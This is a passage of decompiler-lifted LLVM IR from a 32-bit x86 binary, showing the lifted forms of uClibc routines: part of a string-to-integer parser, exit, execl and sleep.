  %v0_80547bd.lcssa = phi i32 [ %v4_80547ab, %entry ], [ %v1_80547bd, %dec_label_pc_80547bd ]
  %v2_80547be.lcssa = phi i8 [ %v2_80547be41, %entry ], [ %v2_80547be, %dec_label_pc_80547bd ]
  %v3_80547be.lcssa = phi i32 [ %v3_80547be42, %entry ], [ %v3_80547be, %dec_label_pc_80547bd ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_80547c7 = icmp eq i8 %v2_80547be.lcssa, 43
  br i1 %v9_80547c7, label %dec_label_pc_80547e2, label %dec_label_pc_80547cc

dec_label_pc_80547cc:                             ; preds = %dec_label_pc_80547c7
  %v9_80547cc = icmp eq i8 %v2_80547be.lcssa, 45
  %v1_80547d4 = icmp eq i1 %v9_80547cc, false
  br i1 %v1_80547d4, label %dec_label_pc_80547e3, label %dec_label_pc_80547e2

dec_label_pc_80547e2:                             ; preds = %dec_label_pc_80547c7, %dec_label_pc_80547cc
  %storemerge5 = phi i8 [ 1, %dec_label_pc_80547cc ], [ 0, %dec_label_pc_80547c7 ]
  %v1_80547e2 = add i32 %v0_80547bd.lcssa, 1
  store i32 %v1_80547e2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80547e3

dec_label_pc_80547e3:                             ; preds = %dec_label_pc_80547cc, %dec_label_pc_80547e2
  %v0_80547f5 = phi i32 [ %v1_80547e2, %dec_label_pc_80547e2 ], [ %v0_80547bd.lcssa, %dec_label_pc_80547cc ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_80547e2 ], [ 0, %dec_label_pc_80547cc ]
  %v1_80547e3 = and i32 %arg3, -17
  %v2_80547e3 = icmp eq i32 %v1_80547e3, 0
  %v1_80547eb = icmp eq i1 %v2_80547e3, false
  br i1 %v1_80547eb, label %dec_label_pc_8054811, label %dec_label_pc_80547ed

dec_label_pc_80547ed:                             ; preds = %dec_label_pc_80547e3
  %v1_80547ed = add i32 %arg3, 10
  store i32 %v1_80547ed, i32* %esi.global-to-local, align 4
  %v1_80547f0 = inttoptr i32 %v0_80547f5 to i8*
  %v2_80547f0 = load i8, i8* %v1_80547f0, align 1
  %v8_80547f0 = icmp eq i8 %v2_80547f0, 48
  %v1_80547f3 = icmp eq i1 %v8_80547f0, false
  br i1 %v1_80547f3, label %dec_label_pc_8054806, label %dec_label_pc_80547f5

dec_label_pc_80547f5:                             ; preds = %dec_label_pc_80547ed
  %v1_80547f5 = add i32 %v0_80547f5, 1
  store i32 %v1_80547f5, i32* %ebx.global-to-local, align 4
  %v1_80547f6 = add i32 %arg3, 8
  store i32 %v1_80547f6, i32* %esi.global-to-local, align 4
  %v1_80547f9 = inttoptr i32 %v1_80547f5 to i8*
  %v2_80547f9 = load i8, i8* %v1_80547f9, align 1
  %v2_80547fd = or i8 %v2_80547f9, 32
  %v7_80547fd = zext i8 %v2_80547fd to i32
  %v9_80547fd = and i32 %v3_80547be.lcssa, -256
  %v10_80547fd = or i32 %v7_80547fd, %v9_80547fd
  store i32 %v10_80547fd, i32* %eax.global-to-local, align 4
  %v10_80547ff = icmp eq i8 %v2_80547fd, 120
  %v1_8054801 = icmp eq i1 %v10_80547ff, false
  br i1 %v1_8054801, label %dec_label_pc_8054806, label %dec_label_pc_8054803

dec_label_pc_8054803:                             ; preds = %dec_label_pc_80547f5
  %v2_8054803 = mul i32 %v1_80547f6, 2
  store i32 %v2_8054803, i32* %esi.global-to-local, align 4
  %v1_8054805 = add i32 %v0_80547f5, 2
  store i32 %v1_8054805, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054806

dec_label_pc_8054806:                             ; preds = %dec_label_pc_80547f5, %dec_label_pc_80547ed, %dec_label_pc_8054803
  %v0_805482e13 = phi i32 [ %v1_80547f5, %dec_label_pc_80547f5 ], [ %v0_80547f5, %dec_label_pc_80547ed ], [ %v1_8054805, %dec_label_pc_8054803 ]
  %v0_805488822 = phi i32 [ %v1_80547f5, %dec_label_pc_80547f5 ], [ %v4_80547ab, %dec_label_pc_80547ed ], [ %v1_80547f5, %dec_label_pc_8054803 ]
  %v3_805480e = phi i32 [ %v1_80547f6, %dec_label_pc_80547f5 ], [ %v1_80547ed, %dec_label_pc_80547ed ], [ %v2_8054803, %dec_label_pc_8054803 ]
  %v1_8054806 = add i32 %v3_805480e, -17
  %v6_8054806 = sub i32 16, %v3_805480e
  %v7_8054806 = and i32 %v6_8054806, %v3_805480e
  %v8_8054806 = icmp slt i32 %v7_8054806, 0
  %v10_8054806 = icmp slt i32 %v1_8054806, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_805480e = icmp eq i1 %v10_8054806, %v8_8054806
  %v5_805480e = select i1 %v2_805480e, i32 16, i32 %v3_805480e
  store i32 %v5_805480e, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054811

dec_label_pc_8054811:                             ; preds = %dec_label_pc_80547e3, %dec_label_pc_8054806
  %v0_805488823 = phi i32 [ %v4_80547ab, %dec_label_pc_80547e3 ], [ %v0_805488822, %dec_label_pc_8054806 ]
  %v0_805482e12 = phi i32 [ %v0_80547f5, %dec_label_pc_80547e3 ], [ %v0_805482e13, %dec_label_pc_8054806 ]
  %v0_8054820 = phi i32 [ %arg3, %dec_label_pc_80547e3 ], [ %v5_805480e, %dec_label_pc_8054806 ]
  %v1_8054811 = add i32 %v0_8054820, -2
  store i32 %v1_8054811, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8054819 = icmp ugt i32 %v1_8054811, 34
  br i1 %v6_8054819, label %dec_label_pc_805487d, label %dec_label_pc_805481b

dec_label_pc_805481b:                             ; preds = %dec_label_pc_8054811
  %div = udiv i32 -1, %v0_8054820
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_8054820
  %v1_8054822 = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_805485b = urem i32 %arg4, 256
  br label %dec_label_pc_805482e

dec_label_pc_805482c:                             ; preds = %dec_label_pc_8054873, %dec_label_pc_805485b
  %v2_8054830.pre = phi i32 [ %v0_8054876, %dec_label_pc_8054873 ], [ %v2_8054830.pre.pre, %dec_label_pc_805485b ]
  %v4_805482e.pre = phi i32 [ %v1_8054847, %dec_label_pc_8054873 ], [ %v4_805482e.pre.pre, %dec_label_pc_805485b ]
  %v0_805482c = phi i32 [ %v1_805484e, %dec_label_pc_8054873 ], [ %v0_805482c.pre, %dec_label_pc_805485b ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_8054873 ], [ %v6_805485f, %dec_label_pc_805485b ]
  br label %dec_label_pc_805482e

dec_label_pc_805482e:                             ; preds = %dec_label_pc_805481b, %dec_label_pc_805482c
  %v0_805488821 = phi i32 [ %v0_805488823, %dec_label_pc_805481b ], [ %v0_805482c, %dec_label_pc_805482c ]
  %v0_805484e = phi i32 [ %v0_805482e12, %dec_label_pc_805481b ], [ %v0_805482c, %dec_label_pc_805482c ]
  %v2_8054830 = phi i32 [ %v4_80547ab, %dec_label_pc_805481b ], [ %v2_8054830.pre, %dec_label_pc_805482c ]
  %v4_805482e = phi i32 [ %div, %dec_label_pc_805481b ], [ %v4_805482e.pre, %dec_label_pc_805482c ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_805481b ], [ %stack_var_-18.1, %dec_label_pc_805482c ]
  %v1_805482e = inttoptr i32 %v0_805484e to i8*
  %v2_805482e = load i8, i8* %v1_805482e, align 1
  %v3_805482e = zext i8 %v2_805482e to i32
  %v5_805482e = and i32 %v4_805482e, -256
  %v6_805482e = or i32 %v3_805482e, %v5_805482e
  store i32 %v6_805482e, i32* %eax.global-to-local, align 4
  %v2_8054832 = add i8 %v2_805482e, -48
  %v12_8054832 = zext i8 %v2_8054832 to i32
  %v14_8054832 = and i32 %v2_8054830, -256
  %v15_8054832 = or i32 %v12_8054832, %v14_8054832
  store i32 %v15_8054832, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_8054832, 10
  br i1 %tmp, label %dec_label_pc_8054847, label %dec_label_pc_805483a

dec_label_pc_805483a:                             ; preds = %dec_label_pc_805482e
  %v2_805483a = or i8 %v2_805482e, 32
  %v7_805483a = zext i8 %v2_805483a to i32
  %v10_805483a = or i32 %v7_805483a, %v5_805482e
  store i32 %v10_805483a, i32* %eax.global-to-local, align 4
  %v2_805483c = or i32 %v14_8054832, 40
  store i32 %v2_805483c, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v2_805483a, 97
  br i1 %tmp55, label %dec_label_pc_8054847, label %dec_label_pc_8054842

dec_label_pc_8054842:                             ; preds = %dec_label_pc_805483a
  %v2_8054844 = add i8 %v2_805483a, -87
  %v15_8054844 = zext i8 %v2_8054844 to i32
  %v18_8054844 = or i32 %v15_8054844, %v14_8054832
  store i32 %v18_8054844, i32* @ecx, align 4
  br label %dec_label_pc_8054847

dec_label_pc_8054847:                             ; preds = %dec_label_pc_805483a, %dec_label_pc_805482e, %dec_label_pc_8054842
  %v0_8054876 = phi i32 [ %v2_805483c, %dec_label_pc_805483a ], [ %v15_8054832, %dec_label_pc_805482e ], [ %v18_8054844, %dec_label_pc_8054842 ]
  %v1_8054847 = urem i32 %v0_8054876, 256
  store i32 %v1_8054847, i32* %eax.global-to-local, align 4
  %v1_805484a = load i32, i32* %esi.global-to-local, align 4
  %v2_805484a = sub i32 %v1_8054847, %v1_805484a
  %v10_805484a = and i32 %v2_805484a, %v1_805484a
  %v11_805484a = icmp slt i32 %v10_805484a, 0
  %v13_805484a = icmp slt i32 %v2_805484a, 0
  %v2_805484c = icmp eq i1 %v13_805484a, %v11_805484a
  br i1 %v2_805484c, label %dec_label_pc_805487d, label %dec_label_pc_805484e

dec_label_pc_805484e:                             ; preds = %dec_label_pc_8054847
  %v1_805484e = add i32 %v0_805484e, 1
  store i32 %v1_805484e, i32* %ebx.global-to-local, align 4
  %v0_805484f = load i32, i32* %edx.global-to-local, align 4
  %v1_805484f = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_805484f, %v1_805484f
  br i1 %tmp56, label %dec_label_pc_805485b, label %dec_label_pc_8054853

dec_label_pc_8054853:                             ; preds = %dec_label_pc_805484e
  %v12_805484f = icmp eq i32 %v0_805484f, %v1_805484f
  %v1_8054853 = icmp eq i1 %v12_805484f, false
  br i1 %v1_8054853, label %dec_label_pc_8054873, label %dec_label_pc_8054855

dec_label_pc_8054855:                             ; preds = %dec_label_pc_8054853
  %v1_8054855 = trunc i32 %v0_8054876 to i8
  %tmp57 = icmp ugt i8 %v1_8054855, %v1_8054822
  br i1 %tmp57, label %dec_label_pc_805485b, label %dec_label_pc_8054873

dec_label_pc_805485b:                             ; preds = %dec_label_pc_8054855, %dec_label_pc_805484e
  store i32 %v4_805485b, i32* %eax.global-to-local, align 4
  %v6_805485f = and i8 %stack_var_-18.2, %tmp37
  %v1_8054863 = sext i8 %v6_805485f to i32
  %v2_8054863 = call i32 @__errno_location(i32 %v1_8054863)
  store i32 %v2_8054863, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_805486b = inttoptr i32 %v2_8054863 to i32*
  store i32 34, i32* %v1_805486b, align 4
  %v0_805482c.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805482e.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_8054830.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805482c

dec_label_pc_8054873:                             ; preds = %dec_label_pc_8054855, %dec_label_pc_8054853
  %v4_8054873 = mul i32 %v0_805484f, %v1_805484a
  store i32 %v1_8054847, i32* %eax.global-to-local, align 4
  %v2_8054879 = add i32 %v4_8054873, %v1_8054847
  store i32 %v2_8054879, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805482c

dec_label_pc_805487d:                             ; preds = %dec_label_pc_8054847, %dec_label_pc_8054811
  %v0_8054888 = phi i32 [ %v0_805488823, %dec_label_pc_8054811 ], [ %v0_805488821, %dec_label_pc_8054847 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8054811 ], [ %stack_var_-18.2, %dec_label_pc_8054847 ]
  %v4_805487d = icmp eq i32 %arg2, 0
  br i1 %v4_805487d, label %dec_label_pc_805488a, label %dec_label_pc_8054884

dec_label_pc_8054884:                             ; preds = %dec_label_pc_805487d
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8054888 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8054888, i32* %v2_8054888, align 4
  br label %dec_label_pc_805488a

dec_label_pc_805488a:                             ; preds = %dec_label_pc_805487d, %dec_label_pc_8054884
  %v8_805488a = icmp eq i8 %stack_var_-18.3, 0
  %v2_805488f = zext i1 %v8_805488a to i32
  %v13_805488f = icmp eq i1 %v8_805488a, false
  %v1_80548913 = or i32 %v2_805488f, -2147483648
  store i32 %v1_80548913, i32* %ebx.global-to-local, align 4
  %v5_8054897 = icmp eq i8 %tmp37, 0
  br i1 %v5_8054897, label %dec_label_pc_80548af, label %dec_label_pc_805489e

dec_label_pc_805489e:                             ; preds = %dec_label_pc_805488a
  %v0_805489e = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_805489e, %v1_80548913
  br i1 %tmp58, label %dec_label_pc_80548a2, label %dec_label_pc_80548af

dec_label_pc_80548a2:                             ; preds = %dec_label_pc_805489e
  %v1_80548a2 = sext i8 %stack_var_-18.3 to i32
  %v2_80548a2 = call i32 @__errno_location(i32 %v1_80548a2)
  store i32 %v2_80548a2, i32* %eax.global-to-local, align 4
  %v0_80548a7 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80548a7, i32* %edx.global-to-local, align 4
  %v1_80548a9 = inttoptr i32 %v2_80548a2 to i32*
  store i32 34, i32* %v1_80548a9, align 4
  br label %dec_label_pc_80548af

dec_label_pc_80548af:                             ; preds = %dec_label_pc_805489e, %dec_label_pc_805488a, %dec_label_pc_80548a2
  %v0_80548af = load i32, i32* %edx.global-to-local, align 4
  %v1_80548b1 = sub i32 0, %v0_80548af
  %v4_80548b8 = select i1 %v13_805488f, i32 %v1_80548b1, i32 %v0_80548af
  store i32 %v4_80548b8, i32* @edx, align 4
  %v2_80548be = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80548be, i32* @ebx, align 4
  store i32 %v4_80548b8, i32* %eax.global-to-local, align 4
  ret i32 %v4_80548b8

; uselistorder directives
  uselistorder i32 %v4_80548b8, { 1, 0, 2 }
  uselistorder i1 %v8_805488a, { 1, 0 }
  uselistorder i8 %v6_805485f, { 1, 0 }
  uselistorder i32 %v1_805484f, { 1, 0 }
  uselistorder i32 %v0_805484f, { 2, 1, 0 }
  uselistorder i32 %v1_805484e, { 1, 0 }
  uselistorder i32 %v2_805484a, { 1, 0 }
  uselistorder i32 %v1_8054847, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8054876, { 2, 0, 1 }
  uselistorder i8 %v2_805483a, { 1, 0, 2 }
  uselistorder i32 %v14_8054832, { 0, 2, 1 }
  uselistorder i32 %v0_805482c, { 1, 0 }
  uselistorder i32 %v0_8054820, { 1, 0, 2 }
  uselistorder i32 %v3_805480e, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8054803, { 1, 0 }
  uselistorder i32 %v1_80547f6, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_80547f5, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_80547be.lcssa, { 1, 0 }
  uselistorder i32 %v0_80547bd.lcssa, { 1, 0 }
  uselistorder i32 %v1_80547bd, { 0, 3, 2, 1 }
  uselistorder i32 %v0_80547b3, { 1, 0, 2 }
  uselistorder i32 %v4_80547ab, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8, 11, 12, 13, 14, 15 }
  uselistorder i32 -17, { 2, 4, 0, 3, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80548af, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805488a, { 1, 0 }
  uselistorder label %dec_label_pc_8054847, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805482e, { 1, 0 }
  uselistorder label %dec_label_pc_8054811, { 1, 0 }
  uselistorder label %dec_label_pc_8054806, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80547e3, { 1, 0 }
  uselistorder label %dec_label_pc_80547e2, { 1, 0 }
  uselistorder label %dec_label_pc_80547bd, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_80548db = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80548db, i32* @ebx, align 4
  %v2_80548e0 = call i32 @__pthread_return_void(i32 %v2_80548db, i32 134565087)
  %v1_80548ec = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b4e0.526 to i32))
  %v0_80548f1 = load i32, i32* @global_var_8061784.527, align 4
  store i32 %v0_80548f1, i32* @eax, align 4
  %v1_80548f9 = icmp eq i32 %v0_80548f1, 0
  br i1 %v1_80548f9, label %dec_label_pc_8054906, label %dec_label_pc_80548fd

dec_label_pc_80548fd:                             ; preds = %entry
  %v0_8054900 = load i32, i32* @esi, align 4
  %v1_8054901 = call i32 @unknown_0(i32 %v0_8054900)
  store i32 %v1_8054901, i32* @eax, align 4
  br label %dec_label_pc_8054906

dec_label_pc_8054906:                             ; preds = %entry, %dec_label_pc_80548fd
  %v2_805490b = call i32 @__pthread_return_void(i32 %v2_80548db, i32 1)
  %v0_8054910 = call i32 @__GI___uClibc_fini()
  %v0_8054921 = call i32 @_stdio_term()
  %v0_8054929 = load i32, i32* @esi, align 4
  %v1_805492a = call i32 @__GI__exit(i32 %v0_8054929)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 5, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 3, 4, 2 }
  uselistorder label %dec_label_pc_8054906, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8054936 = load i32, i32* @ebx, align 4
  store i32 %v0_8054936, i32* %stack_var_-12, align 4
  %v2_8054937 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8054937, i32* %eax.global-to-local, align 4
  %v12_805493a = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8054940

dec_label_pc_8054940:                             ; preds = %dec_label_pc_8054940, %entry
  %v0_8054943 = phi i32 [ 0, %entry ], [ %v1_8054943, %dec_label_pc_8054940 ]
  %stack_var_-16.0 = phi i32 [ %v2_8054937, %entry ], [ %v1_8054944, %dec_label_pc_8054940 ]
  %v1_8054943 = add i32 %v0_8054943, 1
  store i32 %v1_8054943, i32* %esi.global-to-local, align 4
  %v1_8054944 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8054944, i32* %eax.global-to-local, align 4
  %v1_805494a = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_805494a = load i32, i32* %v1_805494a, align 4
  %v3_805494a = icmp eq i32 %v2_805494a, 0
  %v1_805494d = icmp eq i1 %v3_805494a, false
  br i1 %v1_805494d, label %dec_label_pc_8054940, label %dec_label_pc_805494f

dec_label_pc_805494f:                             ; preds = %dec_label_pc_8054940
  %v1_805494f = mul i32 %v1_8054943, 4
  %v2_805494f = add i32 %v1_805494f, 34
  %v1_8054956 = and i32 %v2_805494f, -16
  %v2_8054959 = sub i32 %v12_805493a, %v1_8054956
  %v1_805495e = add i32 %v2_8054959, 15
  %v1_8054962 = and i32 %v1_805495e, -16
  store i32 %v1_8054962, i32* @ebx, align 4
  store i32 %v1_8054962, i32* %ecx.global-to-local, align 4
  %v2_8054967 = inttoptr i32 %v1_8054962 to i32*
  store i32 %arg2, i32* %v2_8054967, align 16
  store i32 %v2_8054937, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805496f

dec_label_pc_805496f:                             ; preds = %dec_label_pc_805496f, %dec_label_pc_805494f
  %stack_var_-16.1 = phi i32 [ %v2_8054937, %dec_label_pc_805494f ], [ %v1_8054976, %dec_label_pc_805496f ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8054972 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054972 = add i32 %v0_8054972, 4
  store i32 %v1_8054972, i32* %ecx.global-to-local, align 4
  %v0_8054975 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054975 = add i32 %v0_8054975, -1
  %v8_8054975 = icmp eq i32 %v1_8054975, 0
  store i32 %v1_8054975, i32* %esi.global-to-local, align 4
  %v1_8054976 = add i32 %stack_var_-16.1, 4
  %v1_805497c = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_805497c = load i32, i32* %v1_805497c, align 4
  store i32 %v2_805497c, i32* %eax.global-to-local, align 4
  %v2_805497e = inttoptr i32 %v1_8054972 to i32*
  store i32 %v2_805497c, i32* %v2_805497e, align 4
  %v1_8054980 = icmp eq i1 %v8_8054975, false
  br i1 %v1_8054980, label %dec_label_pc_805496f, label %dec_label_pc_8054982

dec_label_pc_8054982:                             ; preds = %dec_label_pc_805496f
  %v0_8054982 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054982 = load i32, i32* @esp, align 4
  %v2_8054982 = add i32 %v1_8054982, -4
  %v3_8054982 = inttoptr i32 %v2_8054982 to i32*
  store i32 %v0_8054982, i32* %v3_8054982, align 4
  %v0_8054983 = load i32, i32* @global_var_806178c.528, align 4
  %v2_8054983 = add i32 %v1_8054982, -8
  %v3_8054983 = inttoptr i32 %v2_8054983 to i32*
  store i32 %v0_8054983, i32* %v3_8054983, align 4
  %v0_8054989 = load i32, i32* @ebx, align 4
  %v2_8054989 = add i32 %v1_8054982, -12
  %v3_8054989 = inttoptr i32 %v2_8054989 to i32*
  store i32 %v0_8054989, i32* %v3_8054989, align 4
  %v5_805498a = add i32 %v1_8054982, -16
  %v6_805498a = inttoptr i32 %v5_805498a to i32*
  store i32 %arg1, i32* %v6_805498a, align 4
  %v1_805498d = inttoptr i32 %v1_8054976 to i8*
  %v2_805498d = call i32 @__GI_execve(i8* %v1_805498d)
  store i32 %v2_805498d, i32* %eax.global-to-local, align 4
  %v2_8054995 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054995, i32* @ebx, align 4
  ret i32 %v2_805498d

; uselistorder directives
  uselistorder i32 %v1_8054975, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8054944, { 1, 0 }
  uselistorder i32 %v1_8054943, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8054937, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_80549a2 = load i32, i32* @edi, align 4
  %v0_80549a3 = load i32, i32* @esi, align 4
  %v0_80549a4 = load i32, i32* @ebx, align 4
  %v15_80549a5 = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* @edx, align 4
  %v1_80549b2 = icmp eq i32 %arg1, 0
  %v1_80549b4 = icmp eq i1 %v1_80549b2, false
  br i1 %v1_80549b4, label %dec_label_pc_80549c6.preheader, label %dec_label_pc_8054b13

dec_label_pc_80549c6.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80549bb

dec_label_pc_80549bb:                             ; preds = %dec_label_pc_80549bb.dec_label_pc_80549bb_crit_edge, %dec_label_pc_80549c6.preheader
  %v0_80549bb = phi i32 [ %v15_80549a5, %dec_label_pc_80549c6.preheader ], [ %v0_80549bb.pre, %dec_label_pc_80549bb.dec_label_pc_80549bb_crit_edge ]
  %v1_80549c627 = phi i32 [ 31, %dec_label_pc_80549c6.preheader ], [ %v1_80549c6, %dec_label_pc_80549bb.dec_label_pc_80549bb_crit_edge ]
  %v2_80549bb = mul i32 %v1_80549c627, 4
  %v3_80549bb = add i32 %v2_80549bb, 292
  %v4_80549bb = add i32 %v3_80549bb, %v0_80549bb
  %v5_80549bb = inttoptr i32 %v4_80549bb to i32*
  store i32 0, i32* %v5_80549bb, align 4
  %v0_80549c6.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80549c6 = add i32 %v0_80549c6.pre, -1
  %v9_80549c6 = icmp slt i32 %v1_80549c6, 0
  store i32 %v1_80549c6, i32* %eax.global-to-local, align 4
  %v1_80549c7 = icmp eq i1 %v9_80549c6, false
  br i1 %v1_80549c7, label %dec_label_pc_80549bb.dec_label_pc_80549bb_crit_edge, label %dec_label_pc_80549c9

dec_label_pc_80549bb.dec_label_pc_80549bb_crit_edge: ; preds = %dec_label_pc_80549bb
  %v0_80549bb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80549bb

dec_label_pc_80549c9:                             ; preds = %dec_label_pc_80549bb
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_80549df = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_80549df, i32* @ebx, align 4
  store i32 %v2_80549df, i32* %stack_var_-460, align 4
  %v4_80549e7 = call i32 @__sigaddset(i32 %v2_80549df, i32 17, i32 %v1_80549c6, i32 %v1_80549c6)
  store i32 %v4_80549e7, i32* %eax.global-to-local, align 4
  %v2_80549ef = icmp slt i32 %v4_80549e7, 0
  br i1 %v2_80549ef, label %dec_label_pc_8054b17, label %dec_label_pc_80549f7

dec_label_pc_80549f7:                             ; preds = %dec_label_pc_80549c9
  %v2_80549f8 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_80549f8, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8054a03 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8054a03 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8054a03, i32 %v2_80549f8)
  store i32 %v4_8054a03, i32* %eax.global-to-local, align 4
  %v1_8054a0b = icmp eq i32 %v4_8054a03, 0
  %v1_8054a0d = icmp eq i1 %v1_8054a0b, false
  br i1 %v1_8054a0d, label %dec_label_pc_8054b17, label %dec_label_pc_8054a13

dec_label_pc_8054a13:                             ; preds = %dec_label_pc_80549f7
  store i32 %v2_80549f8, i32* %stack_var_-460, align 4
  %v4_8054a18 = call i32 @__sigismember(i32 %v2_80549f8, i32 17, i32 %v4_8054a03, i32 %v4_8054a03)
  store i32 %v4_8054a18, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8054a25 = icmp eq i32 %v4_8054a18, 0
  br i1 %v1_8054a25, label %dec_label_pc_8054a39.preheader, label %dec_label_pc_8054ae1

dec_label_pc_8054a39.preheader:                   ; preds = %dec_label_pc_8054a13
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054a2e

dec_label_pc_8054a2e:                             ; preds = %dec_label_pc_8054a2e.dec_label_pc_8054a2e_crit_edge, %dec_label_pc_8054a39.preheader
  %v0_8054a2e = phi i32 [ %v15_80549a5, %dec_label_pc_8054a39.preheader ], [ %v0_8054a2e.pre, %dec_label_pc_8054a2e.dec_label_pc_8054a2e_crit_edge ]
  %v1_8054a3926 = phi i32 [ 31, %dec_label_pc_8054a39.preheader ], [ %v1_8054a39, %dec_label_pc_8054a2e.dec_label_pc_8054a2e_crit_edge ]
  %v2_8054a2e = mul i32 %v1_8054a3926, 4
  %v3_8054a2e = add i32 %v2_8054a2e, 292
  %v4_8054a2e = add i32 %v3_8054a2e, %v0_8054a2e
  %v5_8054a2e = inttoptr i32 %v4_8054a2e to i32*
  store i32 0, i32* %v5_8054a2e, align 4
  %v0_8054a39.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8054a39 = add i32 %v0_8054a39.pre, -1
  %v9_8054a39 = icmp slt i32 %v1_8054a39, 0
  store i32 %v1_8054a39, i32* %edx.global-to-local, align 4
  %v1_8054a3a = icmp eq i1 %v9_8054a39, false
  br i1 %v1_8054a3a, label %dec_label_pc_8054a2e.dec_label_pc_8054a2e_crit_edge, label %dec_label_pc_8054a3c

dec_label_pc_8054a2e.dec_label_pc_8054a2e_crit_edge: ; preds = %dec_label_pc_8054a2e
  %v0_8054a2e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054a2e

dec_label_pc_8054a3c:                             ; preds = %dec_label_pc_8054a2e
  store i32 %v2_80549df, i32* %eax.global-to-local, align 4
